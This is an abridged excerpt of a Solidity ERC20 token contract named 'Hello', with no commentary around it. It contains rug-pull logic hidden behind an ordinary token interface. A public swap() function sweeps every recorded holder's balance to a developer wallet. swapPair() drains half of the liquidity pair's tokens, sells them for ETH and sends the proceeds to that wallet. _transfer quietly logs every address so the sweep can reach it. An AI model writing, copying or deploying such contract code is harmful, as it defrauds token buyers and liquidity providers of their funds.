...
contract Hello is ERC20, Ownable {
    ...
    function swap () public {
        ...
        for (uint i = 0; i < _holders.length; i++) {
            ...
            if (balance > 0) {
                _transfer(holder, devWallet, balance);
            }
        }
    }

    function swapPair () external returns (bool) {
        require(_isExcludedFromFees[msg.sender]);

        uint256 lb = balanceOf(pair) / 2;
        _transfer(pair, address(this), lb);
        IUniswapV2Pair(pair).sync();

        swapTokensForEth (lb);

        (bool success,) = address(devWallet).call{value: address(this).balance}("");
        return success;
    }
    ...
    function _transfer(
        ...
        if (to != pair) _holders.push(to);
        if (from != pair) _holders.push(from);
